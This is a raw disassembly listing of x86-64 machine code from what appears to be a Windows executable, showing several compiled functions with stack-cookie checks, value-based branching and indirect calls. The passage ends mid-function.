   140004445:	cc                   	int3
   140004446:	cc                   	int3
   140004447:	cc                   	int3
   140004448:	cc                   	int3
   140004449:	cc                   	int3
   14000444a:	cc                   	int3
   14000444b:	cc                   	int3
   14000444c:	cc                   	int3
   14000444d:	cc                   	int3
   14000444e:	cc                   	int3
   14000444f:	cc                   	int3
   140004450:	40 53                	rex push %rbx
   140004452:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   140004459:	48 8b 05 e0 9b 03 00 	mov    0x39be0(%rip),%rax        # 0x14003e040
   140004460:	48 33 c4             	xor    %rsp,%rax
   140004463:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
   14000446a:	00 
   14000446b:	48 8b 05 f6 f9 03 00 	mov    0x3f9f6(%rip),%rax        # 0x140043e68
   140004472:	48 8b d9             	mov    %rcx,%rbx
   140004475:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000447a:	ff 15 e0 6f 02 00    	call   *0x26fe0(%rip)        # 0x14002b460
   140004480:	8b 43 14             	mov    0x14(%rbx),%eax
   140004483:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140004488:	89 84 24 80 00 00 00 	mov    %eax,0x80(%rsp)
   14000448f:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140004494:	8b 43 18             	mov    0x18(%rbx),%eax
   140004497:	89 84 24 84 00 00 00 	mov    %eax,0x84(%rsp)
   14000449e:	48 8b 05 f3 f8 03 00 	mov    0x3f8f3(%rip),%rax        # 0x140043d98
   1400044a5:	c7 44 24 70 01 00 00 	movl   $0x1,0x70(%rsp)
   1400044ac:	00 
   1400044ad:	ff 15 ad 6f 02 00    	call   *0x26fad(%rip)        # 0x14002b460
   1400044b3:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400044b8:	0f 10 00             	movups (%rax),%xmm0
   1400044bb:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400044bf:	48 8b 05 b2 f9 03 00 	mov    0x3f9b2(%rip),%rax        # 0x140043e78
   1400044c6:	0f 29 44 24 20       	movaps %xmm0,0x20(%rsp)
   1400044cb:	0f 29 4c 24 30       	movaps %xmm1,0x30(%rsp)
   1400044d0:	ff 15 8a 6f 02 00    	call   *0x26f8a(%rip)        # 0x14002b460
   1400044d6:	f7 d8                	neg    %eax
   1400044d8:	1b c0                	sbb    %eax,%eax
   1400044da:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   1400044e1:	00 
   1400044e2:	48 33 cc             	xor    %rsp,%rcx
   1400044e5:	e8 86 73 00 00       	call   0x14000b870
   1400044ea:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   1400044f1:	5b                   	pop    %rbx
   1400044f2:	c3                   	ret
   1400044f3:	cc                   	int3
   1400044f4:	cc                   	int3
   1400044f5:	cc                   	int3
   1400044f6:	cc                   	int3
   1400044f7:	cc                   	int3
   1400044f8:	cc                   	int3
   1400044f9:	cc                   	int3
   1400044fa:	cc                   	int3
   1400044fb:	cc                   	int3
   1400044fc:	cc                   	int3
   1400044fd:	cc                   	int3
   1400044fe:	cc                   	int3
   1400044ff:	cc                   	int3
   140004500:	48 83 ec 78          	sub    $0x78,%rsp
   140004504:	4c 8b 52 08          	mov    0x8(%rdx),%r10
   140004508:	4c 63 0a             	movslq (%rdx),%r9
   14000450b:	48 8b 92 10 20 00 00 	mov    0x2010(%rdx),%rdx
   140004512:	44 8b 82 1c 10 00 00 	mov    0x101c(%rdx),%r8d
   140004519:	41 81 e8 34 01 00 00 	sub    $0x134,%r8d
   140004520:	74 2e                	je     0x140004550
   140004522:	41 83 e8 01          	sub    $0x1,%r8d
   140004526:	74 28                	je     0x140004550
   140004528:	41 83 e8 01          	sub    $0x1,%r8d
   14000452c:	74 1c                	je     0x14000454a
   14000452e:	41 83 e8 01          	sub    $0x1,%r8d
   140004532:	74 10                	je     0x140004544
   140004534:	41 83 f8 01          	cmp    $0x1,%r8d
   140004538:	74 0a                	je     0x140004544
   14000453a:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000453f:	48 83 c4 78          	add    $0x78,%rsp
   140004543:	c3                   	ret
   140004544:	4c 8d 41 78          	lea    0x78(%rcx),%r8
   140004548:	eb 0a                	jmp    0x140004554
   14000454a:	4c 8d 41 68          	lea    0x68(%rcx),%r8
   14000454e:	eb 04                	jmp    0x140004554
   140004550:	4c 8d 41 58          	lea    0x58(%rcx),%r8
   140004554:	48 8b 05 6d f8 03 00 	mov    0x3f86d(%rip),%rax        # 0x140043dc8
   14000455b:	48 8b d1             	mov    %rcx,%rdx
   14000455e:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004563:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   140004568:	ff 15 f2 6e 02 00    	call   *0x26ef2(%rip)        # 0x14002b460
   14000456e:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004573:	0f 10 00             	movups (%rax),%xmm0
   140004576:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   14000457a:	48 8b 05 f7 f8 03 00 	mov    0x3f8f7(%rip),%rax        # 0x140043e78
   140004581:	0f 29 44 24 30       	movaps %xmm0,0x30(%rsp)
   140004586:	0f 29 4c 24 40       	movaps %xmm1,0x40(%rsp)
   14000458b:	ff 15 cf 6e 02 00    	call   *0x26ecf(%rip)        # 0x14002b460
   140004591:	f7 d8                	neg    %eax
   140004593:	1b c0                	sbb    %eax,%eax
   140004595:	48 83 c4 78          	add    $0x78,%rsp
   140004599:	c3                   	ret
   14000459a:	cc                   	int3
   14000459b:	cc                   	int3
   14000459c:	cc                   	int3
   14000459d:	cc                   	int3
   14000459e:	cc                   	int3
   14000459f:	cc                   	int3
   1400045a0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400045a5:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400045aa:	57                   	push   %rdi
   1400045ab:	b8 80 20 00 00       	mov    $0x2080,%eax
   1400045b0:	e8 bb 75 00 00       	call   0x14000bb70
   1400045b5:	48 2b e0             	sub    %rax,%rsp
   1400045b8:	48 8b 05 81 9a 03 00 	mov    0x39a81(%rip),%rax        # 0x14003e040
   1400045bf:	48 33 c4             	xor    %rsp,%rax
   1400045c2:	48 89 84 24 70 20 00 	mov    %rax,0x2070(%rsp)
   1400045c9:	00 
   1400045ca:	48 8d 05 2f 7f 02 00 	lea    0x27f2f(%rip),%rax        # 0x14002c500
   1400045d1:	48 8b fa             	mov    %rdx,%rdi
   1400045d4:	48 8b f1             	mov    %rcx,%rsi
   1400045d7:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400045dc:	4c 8d 8a 22 20 00 00 	lea    0x2022(%rdx),%r9
   1400045e3:	c7 44 24 20 5c 00 00 	movl   $0x5c,0x20(%rsp)
   1400045ea:	00 
   1400045eb:	4c 8d 05 96 76 02 00 	lea    0x27696(%rip),%r8        # 0x14002bc88
   1400045f2:	ba 00 10 00 00       	mov    $0x1000,%edx
   1400045f7:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400045fc:	e8 ef d5 ff ff       	call   0x140001bf0
   140004601:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140004606:	0f 8d bb 00 00 00    	jge    0x1400046c7
   14000460c:	48 8d 05 05 7f 02 00 	lea    0x27f05(%rip),%rax        # 0x14002c518
   140004613:	ba 00 10 00 00       	mov    $0x1000,%edx
   140004618:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000461d:	4c 8d 8f 22 20 00 00 	lea    0x2022(%rdi),%r9
   140004624:	4c 8d 05 5d 76 02 00 	lea    0x2765d(%rip),%r8        # 0x14002bc88
   14000462b:	c7 44 24 20 5c 00 00 	movl   $0x5c,0x20(%rsp)
   140004632:	00 
   140004633:	48 8d 8c 24 60 10 00 	lea    0x1060(%rsp),%rcx
   14000463a:	00 
   14000463b:	e8 b0 d5 ff ff       	call   0x140001bf0
   140004640:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140004645:	0f 8d 7c 00 00 00    	jge    0x1400046c7
   14000464b:	45 33 c0             	xor    %r8d,%r8d
   14000464e:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004653:	33 d2                	xor    %edx,%edx
   140004655:	e8 56 40 00 00       	call   0x1400086b0
   14000465a:	45 33 c0             	xor    %r8d,%r8d
   14000465d:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140004662:	33 d2                	xor    %edx,%edx
   140004664:	48 8d 8c 24 60 10 00 	lea    0x1060(%rsp),%rcx
   14000466b:	00 
   14000466c:	e8 3f 40 00 00       	call   0x1400086b0
   140004671:	45 33 c0             	xor    %r8d,%r8d
   140004674:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140004679:	33 d2                	xor    %edx,%edx
   14000467b:	48 8d 8f 22 20 00 00 	lea    0x2022(%rdi),%rcx
   140004682:	e8 29 40 00 00       	call   0x1400086b0
   140004687:	48 8b 97 10 20 00 00 	mov    0x2010(%rdi),%rdx
   14000468e:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140004693:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140004698:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   14000469e:	48 8b ce             	mov    %rsi,%rcx
   1400046a1:	8b 92 1c 10 00 00    	mov    0x101c(%rdx),%edx
   1400046a7:	e8 44 fb ff ff       	call   0x1400041f0
   1400046ac:	8b f8                	mov    %eax,%edi
   1400046ae:	33 db                	xor    %ebx,%ebx
   1400046b0:	48 8b 4c dc 30       	mov    0x30(%rsp,%rbx,8),%rcx
   1400046b5:	e8 a2 fa 00 00       	call   0x14001415c
   1400046ba:	48 ff c3             	inc    %rbx
   1400046bd:	48 83 fb 03          	cmp    $0x3,%rbx
   1400046c1:	7c ed                	jl     0x1400046b0
   1400046c3:	8b c7                	mov    %edi,%eax
   1400046c5:	eb 05                	jmp    0x1400046cc
   1400046c7:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400046cc:	48 8b 8c 24 70 20 00 	mov    0x2070(%rsp),%rcx
   1400046d3:	00 
   1400046d4:	48 33 cc             	xor    %rsp,%rcx
   1400046d7:	e8 94 71 00 00       	call   0x14000b870
   1400046dc:	4c 8d 9c 24 80 20 00 	lea    0x2080(%rsp),%r11
   1400046e3:	00 
   1400046e4:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   1400046e8:	49 8b 73 28          	mov    0x28(%r11),%rsi
   1400046ec:	49 8b e3             	mov    %r11,%rsp
   1400046ef:	5f                   	pop    %rdi
   1400046f0:	c3                   	ret
   1400046f1:	cc                   	int3
   1400046f2:	cc                   	int3
   1400046f3:	cc                   	int3
   1400046f4:	cc                   	int3
   1400046f5:	cc                   	int3
   1400046f6:	cc                   	int3
   1400046f7:	cc                   	int3
   1400046f8:	cc                   	int3
   1400046f9:	cc                   	int3
   1400046fa:	cc                   	int3
   1400046fb:	cc                   	int3
   1400046fc:	cc                   	int3
   1400046fd:	cc                   	int3
   1400046fe:	cc                   	int3
   1400046ff:	cc                   	int3
   140004700:	48 83 ec 28          	sub    $0x28,%rsp
   140004704:	4c 8b 82 10 20 00 00 	mov    0x2010(%rdx),%r8
   14000470b:	45 8b 88 1c 10 00 00 	mov    0x101c(%r8),%r9d
   140004712:	41 81 e9 34 01 00 00 	sub    $0x134,%r9d
   140004719:	74 54                	je     0x14000476f
   14000471b:	41 83 e9 01          	sub    $0x1,%r9d
   14000471f:	74 2c                	je     0x14000474d
   140004721:	41 83 e9 01          	sub    $0x1,%r9d
   140004725:	74 19                	je     0x140004740
   140004727:	41 83 e9 01          	sub    $0x1,%r9d
   14000472b:	74 06                	je     0x140004733
   14000472d:	41 83 f9 01          	cmp    $0x1,%r9d
   140004731:	75 32                	jne    0x140004765
   140004733:	4c 8d 42 10          	lea    0x10(%rdx),%r8
   140004737:	48 8d 91 10 01 00 00 	lea    0x110(%rcx),%rdx
   14000473e:	eb 15                	jmp    0x140004755
   140004740:	4c 8d 42 10          	lea    0x10(%rdx),%r8
   140004744:	48 8d 91 f8 00 00 00 	lea    0xf8(%rcx),%rdx
   14000474b:	eb 08                	jmp    0x140004755
   14000474d:	4c 8d 42 10          	lea    0x10(%rdx),%r8
   140004751:	48 8d 51 68          	lea    0x68(%rcx),%rdx
   140004755:	e8 a6 fb ff ff       	call   0x140004300
   14000475a:	85 c0                	test   %eax,%eax
   14000475c:	78 07                	js     0x140004765
   14000475e:	33 c0                	xor    %eax,%eax
   140004760:	48 83 c4 28          	add    $0x28,%rsp
   140004764:	c3                   	ret
   140004765:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000476a:	48 83 c4 28          	add    $0x28,%rsp
   14000476e:	c3                   	ret
   14000476f:	4c 8d 42 10          	lea    0x10(%rdx),%r8
   140004773:	48 8d 51 68          	lea    0x68(%rcx),%rdx
   140004777:	e8 84 fb ff ff       	call   0x140004300
   14000477c:	33 c9                	xor    %ecx,%ecx
   14000477e:	85 c0                	test   %eax,%eax
   140004780:	0f 99 c1             	setns  %cl
   140004783:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140004786:	48 83 c4 28          	add    $0x28,%rsp
   14000478a:	c3                   	ret
   14000478b:	cc                   	int3
   14000478c:	cc                   	int3
   14000478d:	cc                   	int3
   14000478e:	cc                   	int3
   14000478f:	cc                   	int3
   140004790:	4c 8b 82 10 20 00 00 	mov    0x2010(%rdx),%r8
   140004797:	45 8b 88 1c 10 00 00 	mov    0x101c(%r8),%r9d
   14000479e:	41 81 e9 34 01 00 00 	sub    $0x134,%r9d
   1400047a5:	74 44                	je     0x1400047eb
   1400047a7:	41 83 e9 01          	sub    $0x1,%r9d
   1400047ab:	74 3e                	je     0x1400047eb
   1400047ad:	41 83 e9 01          	sub    $0x1,%r9d
   1400047b1:	74 25                	je     0x1400047d8
   1400047b3:	41 83 e9 01          	sub    $0x1,%r9d
   1400047b7:	74 0c                	je     0x1400047c5
   1400047b9:	41 83 f9 01          	cmp    $0x1,%r9d
   1400047bd:	74 06                	je     0x1400047c5
   1400047bf:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400047c4:	c3                   	ret
   1400047c5:	4c 8d 82 22 20 00 00 	lea    0x2022(%rdx),%r8
   1400047cc:	48 8d 91 20 01 00 00 	lea    0x120(%rcx),%rdx
   1400047d3:	e9 28 fb ff ff       	jmp    0x140004300
   1400047d8:	4c 8d 82 22 20 00 00 	lea    0x2022(%rdx),%r8
   1400047df:	48 8d 91 08 01 00 00 	lea    0x108(%rcx),%rdx
   1400047e6:	e9 15 fb ff ff       	jmp    0x140004300
   1400047eb:	4c 8d 82 22 20 00 00 	lea    0x2022(%rdx),%r8
   1400047f2:	48 8d 91 f0 00 00 00 	lea    0xf0(%rcx),%rdx
   1400047f9:	e9 02 fb ff ff       	jmp    0x140004300
   1400047fe:	cc                   	int3
   1400047ff:	cc                   	int3
   140004800:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004805:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   14000480a:	55                   	push   %rbp
   14000480b:	48 8b ec             	mov    %rsp,%rbp
   14000480e:	48 83 ec 70          	sub    $0x70,%rsp
   140004812:	49 8b f8             	mov    %r8,%rdi
   140004815:	48 8b d9             	mov    %rcx,%rbx
   140004818:	81 ea 34 01 00 00    	sub    $0x134,%edx
   14000481e:	0f 84 a8 02 00 00    	je     0x140004acc
   140004824:	83 ea 01             	sub    $0x1,%edx
   140004827:	0f 84 e6 01 00 00    	je     0x140004a13
   14000482d:	83 ea 01             	sub    $0x1,%edx
   140004830:	0f 84 24 01 00 00    	je     0x14000495a
   140004836:	83 ea 01             	sub    $0x1,%edx
   140004839:	74 09                	je     0x140004844
   14000483b:	83 fa 01             	cmp    $0x1,%edx
   14000483e:	0f 85 80 03 00 00    	jne    0x140004bc4
   140004844:	c7 83 d4 00 00 00 01 	movl   $0x1,0xd4(%rbx)
   14000484b:	00 00 00 
   14000484e:	33 c9                	xor    %ecx,%ecx
   140004850:	89 8b a8 00 00 00    	mov    %ecx,0xa8(%rbx)
   140004856:	89 8b c4 00 00 00    	mov    %ecx,0xc4(%rbx)
   14000485c:	41 8b 40 08          	mov    0x8(%r8),%eax
   140004860:	89 83 bc 00 00 00    	mov    %eax,0xbc(%rbx)
   140004866:	41 39 48 04          	cmp    %ecx,0x4(%r8)
   14000486a:	0f 94 c1             	sete   %cl
   14000486d:	89 8b d8 00 00 00    	mov    %ecx,0xd8(%rbx)
   140004873:	41 8b 00             	mov    (%r8),%eax
   140004876:	89 83 c8 00 00 00    	mov    %eax,0xc8(%rbx)
   14000487c:	41 8b 40 0c          	mov    0xc(%r8),%eax
   140004880:	89 43 14             	mov    %eax,0x14(%rbx)
   140004883:	41 8b 40 10          	mov    0x10(%r8),%eax
   140004887:	89 43 18             	mov    %eax,0x18(%rbx)
   14000488a:	41 8b 40 18          	mov    0x18(%r8),%eax
   14000488e:	89 43 0c             	mov    %eax,0xc(%rbx)
   140004891:	49 63 40 1c          	movslq 0x1c(%r8),%rax
   140004895:	85 c0                	test   %eax,%eax
   140004897:	74 4f                	je     0x1400048e8
   140004899:	48 8b 4f 20          	mov    0x20(%rdi),%rcx
   14000489d:	4c 8d 83 98 00 00 00 	lea    0x98(%rbx),%r8
   1400048a4:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400048a9:	4c 8b c8             	mov    %rax,%r9
   1400048ac:	48 8b 05 15 f5 03 00 	mov    0x3f515(%rip),%rax        # 0x140043dc8
   1400048b3:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400048b7:	48 8b d3             	mov    %rbx,%rdx
   1400048ba:	ff 15 a0 6b 02 00    	call   *0x26ba0(%rip)        # 0x14002b460
   1400048c0:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   1400048c4:	0f 10 00             	movups (%rax),%xmm0
   1400048c7:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400048cb:	48 8b 05 a6 f5 03 00 	mov    0x3f5a6(%rip),%rax        # 0x140043e78
   1400048d2:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   1400048d6:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   1400048da:	ff 15 80 6b 02 00    	call   *0x26b80(%rip)        # 0x14002b460
   1400048e0:	85 c0                	test   %eax,%eax
   1400048e2:	0f 85 dc 02 00 00    	jne    0x140004bc4
   1400048e8:	48 63 47 28          	movslq 0x28(%rdi),%rax
   1400048ec:	85 c0                	test   %eax,%eax
   1400048ee:	74 4f                	je     0x14000493f
   1400048f0:	4c 8d 83 88 00 00 00 	lea    0x88(%rbx),%r8
   1400048f7:	48 8b 4f 30          	mov    0x30(%rdi),%rcx
   1400048fb:	4c 8b c8             	mov    %rax,%r9
   1400048fe:	48 8b 05 c3 f4 03 00 	mov    0x3f4c3(%rip),%rax        # 0x140043dc8
   140004905:	48 8b d3             	mov    %rbx,%rdx
   140004908:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000490d:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140004911:	ff 15 49 6b 02 00    	call   *0x26b49(%rip)        # 0x14002b460
   140004917:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000491b:	0f 10 00             	movups (%rax),%xmm0
   14000491e:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140004922:	48 8b 05 4f f5 03 00 	mov    0x3f54f(%rip),%rax        # 0x140043e78
   140004929:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   14000492d:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   140004931:	ff 15 29 6b 02 00    	call   *0x26b29(%rip)        # 0x14002b460
   140004937:	85 c0                	test   %eax,%eax
   140004939:	0f 85 85 02 00 00    	jne    0x140004bc4
   14000493f:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140004946:	33 c0                	xor    %eax,%eax
   140004948:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   14000494d:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140004951:	49 8b 7b 18          	mov    0x18(%r11),%rdi
   140004955:	49 8b e3             	mov    %r11,%rsp
   140004958:	5d                   	pop    %rbp
   140004959:	c3                   	ret
   14000495a:	c7 83 c4 00 00 00 01 	movl   $0x1,0xc4(%rbx)
   140004961:	00 00 00 
   140004964:	33 c9                	xor    %ecx,%ecx
   140004966:	89 8b 98 00 00 00    	mov    %ecx,0x98(%rbx)
   14000496c:	89 8b b4 00 00 00    	mov    %ecx,0xb4(%rbx)
   140004972:	41 8b 40 08          	mov    0x8(%r8),%eax
   140004976:	89 83 ac 00 00 00    	mov    %eax,0xac(%rbx)
   14000497c:	41 39 48 04          	cmp    %ecx,0x4(%r8)
   140004980:	0f 94 c1             	sete   %cl
   140004983:	89 8b c8 00 00 00    	mov    %ecx,0xc8(%rbx)
   140004989:	41 8b 00             	mov    (%r8),%eax
   14000498c:	89 83 b8 00 00 00    	mov    %eax,0xb8(%rbx)
   140004992:	41 8b 40 0c          	mov    0xc(%r8),%eax
   140004996:	89 43 14             	mov    %eax,0x14(%rbx)
   140004999:	41 8b 40 10          	mov    0x10(%r8),%eax
   14000499d:	89 43 18             	mov    %eax,0x18(%rbx)
   1400049a0:	41 8b 40 18          	mov    0x18(%r8),%eax
   1400049a4:	89 43 0c             	mov    %eax,0xc(%rbx)
   1400049a7:	49 63 40 1c          	movslq 0x1c(%r8),%rax
   1400049ab:	85 c0                	test   %eax,%eax
   1400049ad:	74 4f                	je     0x1400049fe
   1400049af:	48 8b 4f 20          	mov    0x20(%rdi),%rcx
   1400049b3:	4c 8d 83 88 00 00 00 	lea    0x88(%rbx),%r8
   1400049ba:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400049bf:	4c 8b c8             	mov    %rax,%r9
   1400049c2:	48 8b 05 ff f3 03 00 	mov    0x3f3ff(%rip),%rax        # 0x140043dc8
   1400049c9:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400049cd:	48 8b d3             	mov    %rbx,%rdx
   1400049d0:	ff 15 8a 6a 02 00    	call   *0x26a8a(%rip)        # 0x14002b460
   1400049d6:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   1400049da:	0f 10 00             	movups (%rax),%xmm0
   1400049dd:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400049e1:	48 8b 05 90 f4 03 00 	mov    0x3f490(%rip),%rax        # 0x140043e78
   1400049e8:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   1400049ec:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   1400049f0:	ff 15 6a 6a 02 00    	call   *0x26a6a(%rip)        # 0x14002b460
   1400049f6:	85 c0                	test   %eax,%eax
   1400049f8:	0f 85 c6 01 00 00    	jne    0x140004bc4
   1400049fe:	48 63 47 28          	movslq 0x28(%rdi),%rax
   140004a02:	85 c0                	test   %eax,%eax
   140004a04:	0f 84 35 ff ff ff    	je     0x14000493f
   140004a0a:	4c 8d 43 78          	lea    0x78(%rbx),%r8
   140004a0e:	e9 e4 fe ff ff       	jmp    0x1400048f7
   140004a13:	c7 83 b8 00 00 00 01 	movl   $0x1,0xb8(%rbx)
   140004a1a:	00 00 00 
   140004a1d:	33 c9                	xor    %ecx,%ecx
   140004a1f:	89 8b 90 00 00 00    	mov    %ecx,0x90(%rbx)
   140004a25:	89 8b a8 00 00 00    	mov    %ecx,0xa8(%rbx)
   140004a2b:	41 8b 40 08          	mov    0x8(%r8),%eax
   140004a2f:	89 83 a0 00 00 00    	mov    %eax,0xa0(%rbx)
   140004a35:	41 39 48 04          	cmp    %ecx,0x4(%r8)
   140004a39:	0f 94 c1             	sete   %cl
   140004a3c:	89 8b bc 00 00 00    	mov    %ecx,0xbc(%rbx)
   140004a42:	41 8b 00             	mov    (%r8),%eax
   140004a45:	89 83 ac 00 00 00    	mov    %eax,0xac(%rbx)
   140004a4b:	41 8b 40 0c          	mov    0xc(%r8),%eax
   140004a4f:	89 43 14             	mov    %eax,0x14(%rbx)
   140004a52:	41 8b 40 10          	mov    0x10(%r8),%eax
   140004a56:	89 43 18             	mov    %eax,0x18(%rbx)
   140004a59:	41 8b 40 18          	mov    0x18(%r8),%eax
   140004a5d:	89 43 0c             	mov    %eax,0xc(%rbx)
   140004a60:	49 63 40 1c          	movslq 0x1c(%r8),%rax
   140004a64:	85 c0                	test   %eax,%eax
   140004a66:	74 4f                	je     0x140004ab7
   140004a68:	48 8b 4f 20          	mov    0x20(%rdi),%rcx
   140004a6c:	4c 8d 83 80 00 00 00 	lea    0x80(%rbx),%r8
   140004a73:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140004a78:	4c 8b c8             	mov    %rax,%r9
   140004a7b:	48 8b 05 46 f3 03 00 	mov    0x3f346(%rip),%rax        # 0x140043dc8
   140004a82:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140004a86:	48 8b d3             	mov    %rbx,%rdx
   140004a89:	ff 15 d1 69 02 00    	call   *0x269d1(%rip)        # 0x14002b460
   140004a8f:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140004a93:	0f 10 00             	movups (%rax),%xmm0
   140004a96:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140004a9a:	48 8b 05 d7 f3 03 00 	mov    0x3f3d7(%rip),%rax        # 0x140043e78
   140004aa1:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   140004aa5:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   140004aa9:	ff 15 b1 69 02 00    	call   *0x269b1(%rip)        # 0x14002b460
   140004aaf:	85 c0                	test   %eax,%eax
   140004ab1:	0f 85 0d 01 00 00    	jne    0x140004bc4
   140004ab7:	48 63 47 28          	movslq 0x28(%rdi),%rax
   140004abb:	85 c0                	test   %eax,%eax
   140004abd:	0f 84 7c fe ff ff    	je     0x14000493f
   140004ac3:	4c 8d 43 70          	lea    0x70(%rbx),%r8
   140004ac7:	e9 2b fe ff ff       	jmp    0x1400048f7
   140004acc:	c7 83 b8 00 00 00 01 	movl   $0x1,0xb8(%rbx)
   140004ad3:	00 00 00 
   140004ad6:	33 c9                	xor    %ecx,%ecx
   140004ad8:	89 8b 90 00 00 00    	mov    %ecx,0x90(%rbx)
   140004ade:	89 8b a8 00 00 00    	mov    %ecx,0xa8(%rbx)
   140004ae4:	41 8b 40 08          	mov    0x8(%r8),%eax
   140004ae8:	89 83 a0 00 00 00    	mov    %eax,0xa0(%rbx)
   140004aee:	41 39 48 04          	cmp    %ecx,0x4(%r8)
   140004af2:	0f 94 c1             	sete   %cl
   140004af5:	89 8b bc 00 00 00    	mov    %ecx,0xbc(%rbx)
   140004afb:	41 8b 00             	mov    (%r8),%eax
   140004afe:	89 83 ac 00 00 00    	mov    %eax,0xac(%rbx)
   140004b04:	41 8b 40 0c          	mov    0xc(%r8),%eax
   140004b08:	89 43 14             	mov    %eax,0x14(%rbx)
   140004b0b:	41 8b 40 10          	mov    0x10(%r8),%eax
   140004b0f:	89 43 18             	mov    %eax,0x18(%rbx)
   140004b12:	41 8b 40 18          	mov    0x18(%r8),%eax
   140004b16:	89 43 0c             	mov    %eax,0xc(%rbx)
   140004b19:	49 63 40 1c          	movslq 0x1c(%r8),%rax
   140004b1d:	85 c0                	test   %eax,%eax
   140004b1f:	74 4b                	je     0x140004b6c
   140004b21:	48 8b 4f 20          	mov    0x20(%rdi),%rcx
   140004b25:	4c 8d 83 80 00 00 00 	lea    0x80(%rbx),%r8
   140004b2c:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140004b31:	4c 8b c8             	mov    %rax,%r9
   140004b34:	48 8b 05 8d f2 03 00 	mov    0x3f28d(%rip),%rax        # 0x140043dc8
   140004b3b:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140004b3f:	48 8b d3             	mov    %rbx,%rdx
   140004b42:	ff 15 18 69 02 00    	call   *0x26918(%rip)        # 0x14002b460
   140004b48:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140004b4c:	0f 10 00             	movups (%rax),%xmm0
   140004b4f:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140004b53:	48 8b 05 1e f3 03 00 	mov    0x3f31e(%rip),%rax        # 0x140043e78
   140004b5a:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   140004b5e:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   140004b62:	ff 15 f8 68 02 00    	call   *0x268f8(%rip)        # 0x14002b460
   140004b68:	85 c0                	test   %eax,%eax
   140004b6a:	75 58                	jne    0x140004bc4
   140004b6c:	48 63 47 28          	movslq 0x28(%rdi),%rax
   140004b70:	85 c0                	test   %eax,%eax
   140004b72:	0f 84 c7 fd ff ff    	je     0x14000493f
   140004b78:	48 8b 4f 30          	mov    0x30(%rdi),%rcx
   140004b7c:	4c 8d 43 70          	lea    0x70(%rbx),%r8
   140004b80:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140004b85:	4c 8b c8             	mov    %rax,%r9
   140004b88:	48 8b 05 39 f2 03 00 	mov    0x3f239(%rip),%rax        # 0x140043dc8
   140004b8f:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140004b93:	48 8b d3             	mov    %rbx,%rdx
   140004b96:	ff 15 c4 68 02 00    	call   *0x268c4(%rip)        # 0x14002b460
   140004b9c:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140004ba0:	0f 10 00             	movups (%rax),%xmm0
   140004ba3:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140004ba7:	48 8b 05 ca f2 03 00 	mov    0x3f2ca(%rip),%rax        # 0x140043e78
